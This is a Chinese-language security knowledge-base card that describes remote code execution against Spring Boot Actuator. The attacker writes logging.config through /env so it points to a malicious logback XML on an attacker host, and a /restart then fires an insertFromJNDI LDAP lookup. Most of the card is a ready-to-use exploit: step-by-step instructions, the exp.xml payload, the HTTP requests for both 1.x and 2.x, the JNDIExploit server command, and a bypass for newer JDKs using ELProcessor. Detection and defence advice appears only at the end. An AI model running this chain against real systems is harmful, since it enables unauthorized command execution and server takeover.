---
id: web-java-framework-spring-actuator-restart-logging-config-logback-jndi-rce
title: Spring Boot Actuator restart + logging.config 指向恶意 logback XML：insertFromJNDI 触发 JNDI 命令执行
type: scenario
domain: web
path: web/java/framework/spring
technique: actuator-restart-logging-config-logback-insertfromjndi-rce
aliases:
- logging.config XML JNDI
- insertFromJNDI
- Actuator restart JNDI
- JNDIExploit
- logback 配置 JNDI
tags:
- java
- spring
- spring-boot
- actuator
- restart
- logback
- jndi
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V321
  verified_at: '2026-11-08T15:34:11+08:00'
  notes: 已对照原文核对：/env 写 logging.config=exp.xml（insertFromJNDI ldap://...TomcatBypass/Command/Base64/Y2FsYw==）、JNDIExploit -i、/restart 触发与 1.x/2.x 端点开关均一致；高版本 JDK ELProcessor 提示按原文；未复跑。
---

## 一句话结论

Spring Boot 的 `/env` 可写且 `/restart` 开启时，攻击者把 `logging.config` 指向自己托管的恶意 logback XML，并触发重启；`LoggingApplicationListener` 让 logback 解析该 XML，`<insertFromJNDI env-entry-name="ldap://attacker:1389/...">` 触发 JNDI 查找，恶意 LDAP 服务返回引用并加载远程/本地工厂类，形成命令执行。

## 原理

- `logging.config` 是 Spring Boot 指定日志配置位置的属性；`LoggingApplicationListener#initialize()` 在启动/重启时读取该属性并把 URL 交给 logback 的 `ContextInitializer`。
- logback 的 XML 配置支持 `<insertFromJNDI>` 动作：`<insertFromJNDI env-entry-name="ldap://attacker:1389/..." as="appName"/>` 会在解析配置时执行 JNDI lookup，并把结果插入日志上下文。
- JNDI 客户端连接攻击者 LDAP/RMI 服务；服务返回 `Reference`，其 `ReferenceFactory` 指向可加载的类。低版本 JDK 允许远程 codebase 加载攻击者类；高版本 JDK 默认禁止远程 codebase，可改用本地工厂 gadget（如 Tomcat `BeanFactory` + `javax.el.ELProcessor`，需要目标 classpath 有 Tomcat/EL 实现）或 JNDIExploit 的对应模块。
- `/restart` 端点重启应用上下文，触发 `LoggingApplicationListener` 重新初始化日志系统，使新的 `logging.config` 生效。1.x 需 `endpoints.restart.enabled=true`，2.x 需 `management.endpoint.restart.enabled=true`。
- 与 Jolokia 的 `reloadByURL` 相比，本卡不需要 Jolokia 端点，但需要 `/restart` 和一次重启；sink 相同（logback 解析恶意 XML 的 `insertFromJNDI`）。

## 触发条件

- `/env`（1.x）或 `/actuator/env`（2.x）未授权可写；`/restart` 或 `/actuator/restart` 已开启并可访问。
- classpath 存在 logback，且 XML 解析会处理 `<insertFromJNDI>`。
- 目标能出站访问攻击者的 LDAP/RMI 服务。
- JDK 允许 JNDI 远程 codebase，或攻击者有针对高版本 JDK 的本地工厂/ELProcessor 绕过链。

## 利用步骤

1. 探测 `/env`/`/actuator/env` 可写与 `/restart`/`/actuator/restart` 可达。
2. 在攻击机准备恶意 `exp.xml`，用 Base64 命令模块或自定义 ObjectFactory：

```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://attacker:1389/TomcatBypass/Command/Base64/Y2FsYw==" as="appName" />
</configuration>
```

3. 启动 JNDI 利用服务，例如 `java -jar JNDIExploit-1.0-SNAPSHOT.jar -i attacker-ip`，确认 LDAP 端口 1389 可访问。
4. 写入 `logging.config`：
   - 1.x：`POST /env`（表单）写 `logging.config=http://attacker:8000/exp.xml`；
   - 2.x：`POST /actuator/env`（JSON）写 `{"name":"logging.config","value":"http://attacker:8000/exp.xml"}`。
5. 访问 `/restart` 或 `/actuator/restart`，重启时 logback 加载 XML 并执行 JNDI lookup，触发命令执行。
6. 若高版本 JDK 拦截远程类加载，改用 `javax.el.ELProcessor` 作为 Reference Factory（需要 Tomcat EL 实现）或本地工厂 gadget。
7. 测试后恢复 `logging.config` 原值；该操作会重启业务，必须先取得授权。

## PoC

```xml
<!-- exp.xml -->
<configuration>
  <insertFromJNDI env-entry-name="ldap://attacker:1389/TomcatBypass/Command/Base64/Y2FsYw==" as="appName" />
</configuration>
```

```http
### 1.x 写入
POST /env HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

logging.config=http://attacker:8000/exp.xml
```

```http
### 2.x 写入
POST /actuator/env HTTP/1.1
Host: target
Content-Type: application/json

{"name":"logging.config","value":"http://attacker:8000/exp.xml"}
```

```http
### 触发重启
POST /actuator/restart HTTP/1.1
Host: target
```

```bash
java -jar JNDIExploit-1.0-SNAPSHOT.jar -i attacker-ip
```

## 变体与关联

- 变体：`insertFromJNDI` 的地址换成 `rmi://`，或使用自定义 ObjectFactory/本地工厂。
- 变体：高版本 JDK 下用 `javax.el.ELProcessor` 作为 Reference Factory 绕过远程 codebase 限制（原文提示，需要 Tomcat 版本支持）。
- 关联：[[web-java-framework-spring-actuator-jolokia-logback-reloadbyurl-jndi-rce]]（同一 `insertFromJNDI` sink，入口换成 Jolokia reloadByURL，不需要 restart）、[[web-java-framework-spring-actuator-restart-logging-config-groovy-rce]]（同一 `/restart` + `logging.config` 入口，sink 换成 Groovy 脚本）。
- 边界：`/env` 只读或需认证、`/restart` 未开启、logback 禁用 `insertFromJNDI`、目标不能出站、JDK 高版本且无本地工厂 gadget 时，该链不成立。

## 检测与防御

- 检测：`/env`、`/actuator/env` 出现 `logging.config` 写入且值为外部 URL；随后 `/restart` 与对 1389/1099 端口的异常外连；logback 配置中出现 `insertFromJNDI`、`ldap://`、`rmi://`。
- 防御：关闭或鉴权 Actuator 的 `env`、`restart` 端点；生产环境不开启 restart。
- 防御：`logging.config` 只允许本地 classpath 路径，禁止远程 URL；升级 JDK/禁用 JNDI 远程 codebase（`trustURLCodebase=false`）。
- 加固：限制应用出站访问；logback 配置禁用 JNDI 动作；对配置属性写入做审计与告警。
